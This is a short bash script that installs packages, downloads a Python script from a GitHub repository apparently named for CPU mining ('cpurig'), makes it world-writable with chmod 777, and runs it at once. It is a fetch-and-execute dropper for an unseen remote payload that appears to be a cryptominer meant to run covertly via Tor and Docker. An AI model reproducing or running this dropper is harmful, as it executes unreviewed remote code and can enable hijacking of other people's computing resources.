#!/bin/bash
apt-get install -y git wget screen
apt-get install -y python python-dev
rm -rf ubuntu_tor_docker.py
wget https://raw.githubusercontent.com/ts6aud5vkg/cpurig/master/ubuntu_tor_docker.py
chmod 777 ubuntu_tor_docker.py
python ubuntu_tor_docker.py


